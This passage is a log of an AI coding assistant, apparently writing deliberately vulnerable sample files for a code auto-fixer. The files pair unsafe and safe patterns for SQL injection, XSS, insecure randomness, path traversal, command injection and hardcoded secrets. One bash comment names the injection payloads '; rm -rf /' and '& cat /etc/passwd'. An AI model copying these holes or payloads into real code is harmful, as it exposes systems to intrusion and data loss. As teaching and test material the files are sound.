cursor.fetchall()","oldStart":1,"newStart":1,"oldLines":1,"newLines":35,"linesRemoved":1,"linesAdded":35}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/sample_python_sqli.py."}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:50:30.786Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_xss_vulnerable.js"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_xss_vulnerable.js", "contents": "/**\\n * Sample JavaScript code demonstrating XSS (Cross-Site Scripting) vulnerability and fix\\n */\\n\\n// VULNERABLE: Direct DOM manipulation with user input\\nfunction displayMessageUnsafe(userMessage) {\\n    const element = document.getElementById('message');\\n    // UNSAFE: User input directly inserted into innerHTML - vulnerable to XSS\\n    element.innerHTML = userMessage; // If userMessage contains <script> tags, they will execute\\n}\\n\\n// SAFE: Using textContent instead of innerHTML\\nfunction displayMessageSafe(userMessage) {\\n    const element = document.getElementById('message');\\n    // SAFE: textContent escapes HTML and prevents script execution\\n    element.textContent = userMessage;\\n}\\n\\n// SAFE: Using DOM methods and sanitization\\nfunction displayMessageSafeSanitized(userMessage) {\\n    const element = document.getElementById('message');\\n    // SAFE: Create text node to ensure no HTML is interpreted\\n    const textNode = document.createTextNode(userMessage);\\n    element.appendChild(textNode);\\n}\\n\\n// VULNERABLE: Using eval with user input\\nfunction evaluateUserCodeUnsafe(userCode) {\\n    // UNSAFE: eval executes arbitrary JavaScript code\\n    return eval(userCode); // Extremely dangerous - never do this!\\n}\\n\\n// Example of safe alternative\\nfunction evaluateUserCodeSafe(userCode) {\\n    // SAFE: Use a sandboxed environment or parser\\n    // In production, use proper code evaluation libraries with restrictions\\n    throw new Error('Direct code evaluation not allowed. Use a secure sandbox.');\\n}\\n\\n// VULNERABLE: Setting location with user input\\nfunction redirectUnsafe(url) {\\n    // UNSAFE: User-controlled URL can lead to malicious redirects\\n    window.location.href = url; // Could be javascript: or data: URL\\n}\\n\\n// SAFE: Validating URL before redirect\\nfunction redirectSafe(url) {\\n    // SAFE: Validate URL is from allowed domains\\n    try {\\n        const urlObj = new URL(url);\\n        const allowedDomains = ['example.com', 'trusted-site.com'];\\n        if (allowedDomains.includes(urlObj.hostname)) {\\n            window.location.href = url;\\n        } else {\\n            throw new Error('Redirect to unauthorized domain blocked');\\n        }\\n    } catch (e) {\\n        console.error('Invalid URL:', e);\\n    }\\n}"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ /**\\n+  * Sample JavaScript code demonstrating XSS (Cross-Site Scripting) vulnerability and fix\\n+  */\\n+ \\n+ // VULNERABLE: Direct DOM manipulation with user input\\n+ function displayMessageUnsafe(userMessage) {\\n+     const element = document.getElementById('message');\\n+     // UNSAFE: User input directly inserted into innerHTML - vulnerable to XSS\\n+     element.innerHTML = userMessage; // If userMessage contains <script> tags, they will execute\\n+ }\\n+ \\n+ // SAFE: Using textContent instead of innerHTML\\n+ function displayMessageSafe(userMessage) {\\n+     const element = document.getElementById('message');\\n+     // SAFE: textContent escapes HTML and prevents script execution\\n+     element.textContent = userMessage;\\n+ }\\n+ \\n+ // SAFE: Using DOM methods and sanitization\\n+ function displayMessageSafeSanitized(userMessage) {\\n+     const element = document.getElementById('message');\\n+     // SAFE: Create text node to ensure no HTML is interpreted\\n+     const textNode = document.createTextNode(userMessage);\\n+     element.appendChild(textNode);\\n+ }\\n+ \\n+ // VULNERABLE: Using eval with user input\\n+ function evaluateUserCodeUnsafe(userCode) {\\n+     // UNSAFE: eval executes arbitrary JavaScript code\\n+     return eval(userCode); // Extremely dangerous - never do this!\\n+ }\\n+ \\n+ // Example of safe alternative\\n+ function evaluateUserCodeSafe(userCode) {\\n+     // SAFE: Use a sandboxed environment or parser\\n+     // In production, use proper code evaluation libraries with restrictions\\n+     throw new Error('Direct code evaluation not allowed. Use a secure sandbox.');\\n+ }\\n+ \\n+ // VULNERABLE: Setting location with user input\\n+ function redirectUnsafe(url) {\\n+     // UNSAFE: User-controlled URL can lead to malicious redirects\\n+     window.location.href = url; // Could be javascript: or data: URL\\n+ }\\n+ \\n+ // SAFE: Validating URL before redirect\\n+ function redirectSafe(url) {\\n+     // SAFE: Validate URL is from allowed domains\\n+     try {\\n+         const urlObj = new URL(url);\\n+         const allowedDomains = ['example.com', 'trusted-site.com'];\\n+         if (allowedDomains.includes(urlObj.hostname)) {\\n+             window.location.href = url;\\n+         } else {\\n+             throw new Error('Redirect to unauthorized domain blocked');\\n+         }\\n+     } catch (e) {\\n+         console.error('Invalid URL:', e);\\n+     }\\n+ }","oldStart":1,"newStart":1,"oldLines":1,"newLines":60,"linesRemoved":1,"linesAdded":60}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/sample_xss_vulnerable.js."}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:50:47.799Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "read_lints",
          "parameters": "{"paths":["sample_python_sqli.py","sample_xss_vulnerable.js"]}",
          "rawArguments": "{"paths": ["sample_python_sqli.py","sample_xss_vulnerable.js"]}",
          "result": "{}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:50:52.922Z,
        "text": "Added 2 more sample code files:

1. **\`sample_python_sqli.py\`** — SQL injection examples in Python (unsafe f-strings/formatting and a safe parameterized query).

2. **\`sample_xss_vulnerable.js\`** — XSS examples in JavaScript covering:
   - Unsafe \`innerHTML\` usage
   - Safe \`textContent\` usage
   - Dangerous \`eval()\` usage
   - Unsafe redirects vs. validated redirects

All 4 sample files (2 from before + 2 new) are in the repo root and demonstrate common security vulnerabilities with both vulnerable and safe patterns.",
        "tokens": {
          "inputCount": 38831,
          "outputCount": 1090,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [
          {
            "relativePath": "sample_python_sqli.py",
            "startLine": 1,
          },
          {
            "relativePath": "sample_xss_vulnerable.js",
            "startLine": 1,
          },
        ],
        "date": 2025-10-29T16:51:01.028Z,
        "text": "and 2 more files",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "USER_PROMPT",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:51:04.165Z,
        "text": "Adding 2 more sample code files to the repo root.
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:51:04.231Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_insecure_random.py"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_insecure_random.py", "contents": "\\"\\"\\"\\nSample Python code demonstrating insecure randomness vulnerability and fix\\n\\"\\"\\"\\n\\nimport random\\nimport secrets\\nimport hashlib\\nimport os\\n\\n# VULNERABLE: Using pseudo-random for security-sensitive operations\\ndef generate_token_unsafe():\\n    # UNSAFE: random() uses Mersenne Twister PRNG - predictable\\n    token = random.randint(1000000, 9999999)\\n    return str(token)\\n\\n\\ndef generate_session_id_unsafe():\\n    # UNSAFE: random.random() is predictable, not cryptographically secure\\n    session_id = str(random.random())\\n    return hashlib.md5(session_id.encode()).hexdigest()\\n\\n\\n# SAFE: Using cryptographically secure random\\ndef generate_token_safe():\\n    # SAFE: secrets module uses os.urandom() - cryptographically secure\\n    token = secrets.randbelow(9000000) + 1000000\\n    return str(token)\\n\\n\\ndef generate_session_id_safe():\\n    # SAFE: secrets.token_hex() uses cryptographically secure random\\n    session_id = secrets.token_hex(16)\\n    return session_id\\n\\n\\ndef generate_password_safe(length=16):\\n    # SAFE: secrets.choice() uses secure random generator\\n    alphabet = \\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*\\"\\n    password = \\"\\".join(secrets.choice(alphabet) for _ in range(length))\\n    return password\\n\\n\\n# VULNERABLE: Weak seed initialization\\ndef generate_secret_unsafe():\\n    # UNSAFE: Seeding with time is predictable\\n    random.seed(os.getpid())  # Process ID can be guessed\\n    return random.randint(1000, 9999)\\n\\n\\n# SAFE: Direct use of os.urandom for critical operations\\ndef generate_secret_safe():\\n    # SAFE: os.urandom() provides cryptographically secure random bytes\\n    random_bytes = os.urandom(4)\\n    return int.from_bytes(random_bytes, byteorder=\\"big\\")"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ \\"\\"\\"\\n+ Sample Python code demonstrating insecure randomness vulnerability and fix\\n+ \\"\\"\\"\\n+ \\n+ import random\\n+ import secrets\\n+ import hashlib\\n+ import os\\n+ \\n+ # VULNERABLE: Using pseudo-random for security-sensitive operations\\n+ def generate_token_unsafe():\\n+     # UNSAFE: random() uses Mersenne Twister PRNG - predictable\\n+     token = random.randint(1000000, 9999999)\\n+     return str(token)\\n+ \\n+ \\n+ def generate_session_id_unsafe():\\n+     # UNSAFE: random.random() is predictable, not cryptographically secure\\n+     session_id = str(random.random())\\n+     return hashlib.md5(session_id.encode()).hexdigest()\\n+ \\n+ \\n+ # SAFE: Using cryptographically secure random\\n+ def generate_token_safe():\\n+     # SAFE: secrets module uses os.urandom() - cryptographically secure\\n+     token = secrets.randbelow(9000000) + 1000000\\n+     return str(token)\\n+ \\n+ \\n+ def generate_session_id_safe():\\n+     # SAFE: secrets.token_hex() uses cryptographically secure random\\n+     session_id = secrets.token_hex(16)\\n+     return session_id\\n+ \\n+ \\n+ def generate_password_safe(length=16):\\n+     # SAFE: secrets.choice() uses secure random generator\\n+     alphabet = \\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*\\"\\n+     password = \\"\\".join(secrets.choice(alphabet) for _ in range(length))\\n+     return password\\n+ \\n+ \\n+ # VULNERABLE: Weak seed initialization\\n+ def generate_secret_unsafe():\\n+     # UNSAFE: Seeding with time is predictable\\n+     random.seed(os.getpid())  # Process ID can be guessed\\n+     return random.randint(1000, 9999)\\n+ \\n+ \\n+ # SAFE: Direct use of os.urandom for critical operations\\n+ def generate_secret_safe():\\n+     # SAFE: os.urandom() provides cryptographically secure random bytes\\n+     random_bytes = os.urandom(4)\\n+     return int.from_bytes(random_bytes, byteorder=\\"big\\")","oldStart":1,"newStart":1,"oldLines":1,"newLines":54,"linesRemoved":1,"linesAdded":54}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/sample_insecure_random.py."}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:51:04.231Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_path_traversal.go"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_path_traversal.go", "contents": "package main\\n\\nimport (\\n\\t\\"fmt\\"\\n\\t\\"io/ioutil\\"\\n\\t\\"os\\"\\n\\t\\"path/filepath\\"\\n\\t\\"strings\\"\\n)\\n\\n// VULNERABLE: Path traversal vulnerability\\nfunc readFileUnsafe(filename string) ([]byte, error) {\\n\\t// UNSAFE: No validation, allows directory traversal (../../../etc/passwd)\\n\\tfilePath := filepath.Join(\\"uploads\\", filename)\\n\\treturn ioutil.ReadFile(filePath)\\n}\\n\\n// VULNERABLE: Direct concatenation without sanitization\\nfunc getFilePathUnsafe(userInput string) string {\\n\\t// UNSAFE: User input can contain .. or / to traverse directories\\n\\tbaseDir := \\"/var/www/uploads\\"\\n\\treturn baseDir + \\"/\\" + userInput // Dangerous!\\n}\\n\\n// SAFE: Using filepath.Base() and proper validation\\nfunc readFileSafe(filename string) ([]byte, error) {\\n\\t// SAFE: filepath.Base() removes directory components\\n\\tsafeFilename := filepath.Base(filename)\\n\\t\\n\\t// SAFE: Additional validation to prevent null bytes or absolute paths\\n\\tif strings.Contains(safeFilename, \\"..\\") || strings.Contains(safeFilename, \\"\\\\x00\\") {\\n\\t\\treturn nil, fmt.Errorf(\\"invalid filename\\")\\n\\t}\\n\\t\\n\\tfilePath := filepath.Join(\\"uploads\\", safeFilename)\\n\\t\\n\\t// SAFE: Resolve absolute path and verify it's within base directory\\n\\tabsPath, err := filepath.Abs(filePath)\\n\\tif err != nil {\\n\\t\\treturn nil, err\\n\\t}\\n\\t\\n\\tbaseDir, _ := filepath.Abs(\\"uploads\\")\\n\\tif !strings.HasPrefix(absPath, baseDir) {\\n\\t\\treturn nil, fmt.Errorf(\\"path traversal detected\\")\\n\\t}\\n\\t\\n\\treturn ioutil.ReadFile(absPath)\\n}\\n\\n// SAFE: Using filepath.Clean() and absolute path verification\\nfunc getFilePathSafe(userInput string) (string, error) {\\n\\t// SAFE: Clean the path first\\n\\tcleaned := filepath.Clean(userInput)\\n\\t\\n\\t// SAFE: Remove any directory traversal attempts\\n\\tif strings.Contains(cleaned, \\"..\\") {\\n\\t\\treturn \\"\\", fmt.Errorf(\\"path traversal not allowed\\")\\n\\t}\\n\\t\\n\\tbaseDir, _ := filepath.Abs(\\"/var/www/uploads\\")\\n\\tsafePath := filepath.Join(baseDir, cleaned)\\n\\t\\n\\t// SAFE: Verify the resolved path is still within base directory\\n\\tif !strings.HasPrefix(safePath, baseDir) {\\n\\t\\treturn \\"\\", fmt.Errorf(\\"invalid path\\")\\n\\t}\\n\\t\\n\\treturn safePath, nil\\n}\\n\\n// SAFE: Using a whitelist approach\\nfunc readFileSafeWhitelist(filename string) ([]byte, error) {\\n\\t// SAFE: Only allow alphanumeric, dash, underscore, and dot\\n\\tallowedChars := \\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_./\\"\\n\\tfor _, char := range filename {\\n\\t\\tif !strings.ContainsRune(allowedChars, char) {\\n\\t\\t\\treturn nil, fmt.Errorf(\\"invalid character in filename\\")\\n\\t\\t}\\n\\t}\\n\\t\\n\\tfilePath := filepath.Join(\\"uploads\\", filename)\\n\\tabsPath, err := filepath.Abs(filePath)\\n\\tif err != nil {\\n\\t\\treturn nil, err\\n\\t}\\n\\t\\n\\tbaseDir, _ := filepath.Abs(\\"uploads\\")\\n\\tif !strings.HasPrefix(absPath, baseDir) {\\n\\t\\treturn nil, fmt.Errorf(\\"path outside allowed directory\\")\\n\\t}\\n\\t\\n\\treturn ioutil.ReadFile(absPath)\\n}"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ package main\\n+ \\n+ import (\\n+ \\t\\"fmt\\"\\n+ \\t\\"io/ioutil\\"\\n+ \\t\\"os\\"\\n+ \\t\\"path/filepath\\"\\n+ \\t\\"strings\\"\\n+ )\\n+ \\n+ // VULNERABLE: Path traversal vulnerability\\n+ func readFileUnsafe(filename string) ([]byte, error) {\\n+ \\t// UNSAFE: No validation, allows directory traversal (../../../etc/passwd)\\n+ \\tfilePath := filepath.Join(\\"uploads\\", filename)\\n+ \\treturn ioutil.ReadFile(filePath)\\n+ }\\n+ \\n+ // VULNERABLE: Direct concatenation without sanitization\\n+ func getFilePathUnsafe(userInput string) string {\\n+ \\t// UNSAFE: User input can contain .. or / to traverse directories\\n+ \\tbaseDir := \\"/var/www/uploads\\"\\n+ \\treturn baseDir + \\"/\\" + userInput // Dangerous!\\n+ }\\n+ \\n+ // SAFE: Using filepath.Base() and proper validation\\n+ func readFileSafe(filename string) ([]byte, error) {\\n+ \\t// SAFE: filepath.Base() removes directory components\\n+ \\tsafeFilename := filepath.Base(filename)\\n+ \\t\\n+ \\t// SAFE: Additional validation to prevent null bytes or absolute paths\\n+ \\tif strings.Contains(safeFilename, \\"..\\") || strings.Contains(safeFilename, \\"\\\\x00\\") {\\n+ \\t\\treturn nil, fmt.Errorf(\\"invalid filename\\")\\n+ \\t}\\n+ \\t\\n+ \\tfilePath := filepath.Join(\\"uploads\\", safeFilename)\\n+ \\t\\n+ \\t// SAFE: Resolve absolute path and verify it's within base directory\\n+ \\tabsPath, err := filepath.Abs(filePath)\\n+ \\tif err != nil {\\n+ \\t\\treturn nil, err\\n+ \\t}\\n+ \\t\\n+ \\tbaseDir, _ := filepath.Abs(\\"uploads\\")\\n+ \\tif !strings.HasPrefix(absPath, baseDir) {\\n+ \\t\\treturn nil, fmt.Errorf(\\"path traversal detected\\")\\n+ \\t}\\n+ \\t\\n+ \\treturn ioutil.ReadFile(absPath)\\n+ }\\n+ \\n+ // SAFE: Using filepath.Clean() and absolute path verification\\n+ func getFilePathSafe(userInput string) (string, error) {\\n+ \\t// SAFE: Clean the path first\\n+ \\tcleaned := filepath.Clean(userInput)\\n+ \\t\\n+ \\t// SAFE: Remove any directory traversal attempts\\n+ \\tif strings.Contains(cleaned, \\"..\\") {\\n+ \\t\\treturn \\"\\", fmt.Errorf(\\"path traversal not allowed\\")\\n+ \\t}\\n+ \\t\\n+ \\tbaseDir, _ := filepath.Abs(\\"/var/www/uploads\\")\\n+ \\tsafePath := filepath.Join(baseDir, cleaned)\\n+ \\t\\n+ \\t// SAFE: Verify the resolved path is still within base directory\\n+ \\tif !strings.HasPrefix(safePath, baseDir) {\\n+ \\t\\treturn \\"\\", fmt.Errorf(\\"invalid path\\")\\n+ \\t}\\n+ \\t\\n+ \\treturn safePath, nil\\n+ }\\n+ \\n+ // SAFE: Using a whitelist approach\\n+ func readFileSafeWhitelist(filename string) ([]byte, error) {\\n+ \\t// SAFE: Only allow alphanumeric, dash, underscore, and dot\\n+ \\tallowedChars := \\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_./\\"\\n+ \\tfor _, char := range filename {\\n+ \\t\\tif !strings.ContainsRune(allowedChars, char) {\\n+ \\t\\t\\treturn nil, fmt.Errorf(\\"invalid character in filename\\")\\n+ \\t\\t}\\n+ \\t}\\n+ \\t\\n+ \\tfilePath := filepath.Join(\\"uploads\\", filename)\\n+ \\tabsPath, err := filepath.Abs(filePath)\\n+ \\tif err != nil {\\n+ \\t\\treturn nil, err\\n+ \\t}\\n+ \\t\\n+ \\tbaseDir, _ := filepath.Abs(\\"uploads\\")\\n+ \\tif !strings.HasPrefix(absPath, baseDir) {\\n+ \\t\\treturn nil, fmt.Errorf(\\"path outside allowed directory\\")\\n+ \\t}\\n+ \\t\\n+ \\treturn ioutil.ReadFile(absPath)\\n+ }","oldStart":1,"newStart":1,"oldLines":1,"newLines":94,"linesRemoved":1,"linesAdded":94}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/sample_path_traversal.go."}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:51:29.667Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "read_lints",
          "parameters": "{"paths":["sample_insecure_random.py","sample_path_traversal.go"]}",
          "rawArguments": "{"paths": ["sample_insecure_random.py","sample_path_traversal.go"]}",
          "result": "{}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:51:36.795Z,
        "text": "Added 2 more sample code files:

1. **\`sample_insecure_random.py\`** — Insecure randomness in Python, including:
   - Unsafe use of \`random\` module for security-sensitive operations
   - Safe use of \`secrets\` module for cryptographic operations
   - Proper secure random generation for tokens, passwords, and session IDs

2. **\`sample_path_traversal.go\`** — Path traversal (directory traversal) in Go, including:
   - Unsafe file access without validation
   - Safe path validation using \`filepath.Base()\`, \`filepath.Clean()\`, and absolute path verification
   - Whitelist approach for filename validation

You now have 6 sample files in the repo root covering SQL injection, XSS, insecure randomness, and path traversal across multiple languages (SQL, Java, Python, JavaScript, Go).",
        "tokens": {
          "inputCount": 41912,
          "outputCount": 1713,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:19:17.398Z,
        "text": "let's write 2 sample code files in the repo root",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "USER_PROMPT",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:19:22.989Z,
        "text": "Creating 2 sample code files in the repo root:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:19:23.115Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_command_injection.sh"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_command_injection.sh", "contents": "#!/bin/bash\\n\\n# Sample code demonstrating command injection vulnerabilities and fixes\\n\\n# VULNERABLE: Direct command execution with user input\\nprocess_user_input_unsafe() {\\n    local user_input=\\"$1\\"\\n    # UNSAFE: User input directly executed - allows command injection\\n    # Attack: user can input \\"; rm -rf /\\" or \\"& cat /etc/passwd\\"\\n    echo \\"Processing: $user_input\\"\\n    eval \\"ls -la $user_input\\"  # Dangerous!\\n}\\n\\n# VULNERABLE: Using backticks or $() without sanitization\\nget_file_info_unsafe() {\\n    local filename=\\"$1\\"\\n    # UNSAFE: Backticks execute commands in user input\\n    result=\`ls -l $filename\`  # Dangerous!\\n    echo \\"$result\\"\\n}\\n\\n# SAFE: Properly quoting and validating input\\nprocess_user_input_safe() {\\n    local user_input=\\"$1\\"\\n    # SAFE: Quote variable to prevent word splitting and pathname expansion\\n    if [[ ! \\"$user_input\\" =~ ^[a-zA-Z0-9._-]+$ ]]; then\\n        echo \\"Error: Invalid characters in input\\"\\n        return 1\\n    fi\\n    # SAFE: Use printf or properly quoted variables\\n    printf \\"Processing: %s\\\\n\\" \\"$user_input\\"\\n    ls -la -- \\"$user_input\\"  # -- prevents option injection\\n}\\n\\n# SAFE: Using arrays for arguments\\nexecute_command_safe() {\\n    local filename=\\"$1\\"\\n    # SAFE: Validate input format\\n    if [[ ! \\"$filename\\" =~ ^[a-zA-Z0-9._/-]+$ ]] || [[ \\"$filename\\" =~ \\\\.\\\\. ]]; then\\n        echo \\"Error: Invalid filename\\"\\n        return 1\\n    fi\\n    # SAFE: Use array to separate arguments\\n    local cmd=(\\"ls\\" \\"-l\\" \\"--\\" \\"$filename\\")\\n    \\"\${cmd[@]}\\"\\n}\\n\\n# SAFE: Restricted pattern matching\\nvalidate_and_process() {\\n    local user_input=\\"$1\\"\\n    # SAFE: Whitelist approach - only allow specific characters\\n    if [[ \\"$user_input\\" =~ ^[a-zA-Z0-9._-]+$ ]]; then\\n        filepath=\\"/safe/directory/$user_input\\"\\n        [[ -f \\"$filepath\\" ]] && cat -- \\"$filepath\\"\\n    else\\n        echo \\"Invalid input: only alphanumeric, dots, dashes, and underscores allowed\\"\\n    fi\\n}"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ #!/bin/bash\\n+ \\n+ # Sample code demonstrating command injection vulnerabilities and fixes\\n+ \\n+ # VULNERABLE: Direct command execution with user input\\n+ process_user_input_unsafe() {\\n+     local user_input=\\"$1\\"\\n+     # UNSAFE: User input directly executed - allows command injection\\n+     # Attack: user can input \\"; rm -rf /\\" or \\"& cat /etc/passwd\\"\\n+     echo \\"Processing: $user_input\\"\\n+     eval \\"ls -la $user_input\\"  # Dangerous!\\n+ }\\n+ \\n+ # VULNERABLE: Using backticks or $() without sanitization\\n+ get_file_info_unsafe() {\\n+     local filename=\\"$1\\"\\n+     # UNSAFE: Backticks execute commands in user input\\n+     result=\`ls -l $filename\`  # Dangerous!\\n+     echo \\"$result\\"\\n+ }\\n+ \\n+ # SAFE: Properly quoting and validating input\\n+ process_user_input_safe() {\\n+     local user_input=\\"$1\\"\\n+     # SAFE: Quote variable to prevent word splitting and pathname expansion\\n+     if [[ ! \\"$user_input\\" =~ ^[a-zA-Z0-9._-]+$ ]]; then\\n+         echo \\"Error: Invalid characters in input\\"\\n+         return 1\\n+     fi\\n+     # SAFE: Use printf or properly quoted variables\\n+     printf \\"Processing: %s\\\\n\\" \\"$user_input\\"\\n+     ls -la -- \\"$user_input\\"  # -- prevents option injection\\n+ }\\n+ \\n+ # SAFE: Using arrays for arguments\\n+ execute_command_safe() {\\n+     local filename=\\"$1\\"\\n+     # SAFE: Validate input format\\n+     if [[ ! \\"$filename\\" =~ ^[a-zA-Z0-9._/-]+$ ]] || [[ \\"$filename\\" =~ \\\\.\\\\. ]]; then\\n+         echo \\"Error: Invalid filename\\"\\n+         return 1\\n+     fi\\n+     # SAFE: Use array to separate arguments\\n+     local cmd=(\\"ls\\" \\"-l\\" \\"--\\" \\"$filename\\")\\n+     \\"\${cmd[@]}\\"\\n+ }\\n+ \\n+ # SAFE: Restricted pattern matching\\n+ validate_and_process() {\\n+     local user_input=\\"$1\\"\\n+     # SAFE: Whitelist approach - only allow specific characters\\n+     if [[ \\"$user_input\\" =~ ^[a-zA-Z0-9._-]+$ ]]; then\\n+         filepath=\\"/safe/directory/$user_input\\"\\n+         [[ -f \\"$filepath\\" ]] && cat -- \\"$filepath\\"\\n+     else\\n+         echo \\"Invalid input: only alphanumeric, dots, dashes, and underscores allowed\\"\\n+     fi\\n+ }","oldStart":1,"newStart":1,"oldLines":1,"newLines":58,"linesRemoved":1,"linesAdded":58}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/sample_command_injection.sh.","contentsAfterEdit":"#!/bin/bash\\n\\n# Sample code demonstrating command injection vulnerabilities and fixes\\n\\n# VULNERABLE: Direct command execution with user input\\nprocess_user_input_unsafe() {\\n    local user_input=\\"$1\\"\\n    # UNSAFE: User input directly executed - allows command injection\\n    # Attack: user can input \\"; rm -rf /\\" or \\"& cat /etc/passwd\\"\\n    echo \\"Processing: $user_input\\"\\n    eval \\"ls -la $user_input\\"  # Dangerous!\\n}\\n\\n# VULNERABLE: Using backticks or $() without sanitization\\nget_file_info_unsafe() {\\n    local filename=\\"$1\\"\\n    # UNSAFE: Backticks execute commands in user input\\n    result=\`ls -l $filename\`  # Dangerous!\\n    echo \\"$result\\"\\n}\\n\\n# SAFE: Properly quoting and validating input\\nprocess_user_input_safe() {\\n    local user_input=\\"$1\\"\\n    # SAFE: Quote variable to prevent word splitting and pathname expansion\\n    if [[ ! \\"$user_input\\" =~ ^[a-zA-Z0-9._-]+$ ]]; then\\n        echo \\"Error: Invalid characters in input\\"\\n        return 1\\n    fi\\n    # SAFE: Use printf or properly quoted variables\\n    printf \\"Processing: %s\\\\n\\" \\"$user_input\\"\\n    ls -la -- \\"$user_input\\"  # -- prevents option injection\\n}\\n\\n# SAFE: Using arrays for arguments\\nexecute_command_safe() {\\n    local filename=\\"$1\\"\\n    # SAFE: Validate input format\\n    if [[ ! \\"$filename\\" =~ ^[a-zA-Z0-9._/-]+$ ]] || [[ \\"$filename\\" =~ \\\\.\\\\. ]]; then\\n        echo \\"Error: Invalid filename\\"\\n        return 1\\n    fi\\n    # SAFE: Use array to separate arguments\\n    local cmd=(\\"ls\\" \\"-l\\" \\"--\\" \\"$filename\\")\\n    \\"\${cmd[@]}\\"\\n}\\n\\n# SAFE: Restricted pattern matching\\nvalidate_and_process() {\\n    local user_input=\\"$1\\"\\n    # SAFE: Whitelist approach - only allow specific characters\\n    if [[ \\"$user_input\\" =~ ^[a-zA-Z0-9._-]+$ ]]; then\\n        filepath=\\"/safe/directory/$user_input\\"\\n        [[ -f \\"$filepath\\" ]] && cat -- \\"$filepath\\"\\n    else\\n        echo \\"Invalid input: only alphanumeric, dots, dashes, and underscores allowed\\"\\n    fi\\n}\\n"}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:19:23.115Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_hardcoded_secrets.java"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_hardcoded_secrets.java", "contents": "import java.sql.Connection;\\nimport java.sql.DriverManager;\\nimport java.sql.SQLException;\\n\\n/**\\n * Sample Java code demonstrating hardcoded secrets vulnerability and fix\\n */\\n\\npublic class HardcodedSecretsExample {\\n\\n    // VULNERABLE: Hardcoded credentials\\n    public Connection connectUnsafe() throws SQLException {\\n        // UNSAFE: Hardcoded username and password in source code\\n        String url = \\"jdbc:mysql://localhost:3306/mydb\\";\\n        String username = \\"admin\\";\\n        String password = \\"SuperSecret123!\\";  // Exposed in source code!\\n        return DriverManager.getConnection(url, username, password);\\n    }\\n\\n    // VULNERABLE: Base64 encoded (not encrypted!)\\n    public Connection connectUnsafeBase64() throws SQLException {\\n        // UNSAFE: Base64 is encoding, not encryption - easily decoded\\n        String encodedPassword = \\"cGFzc3dvcmQxMjM=\\";  // Still unsafe!\\n        String password = new 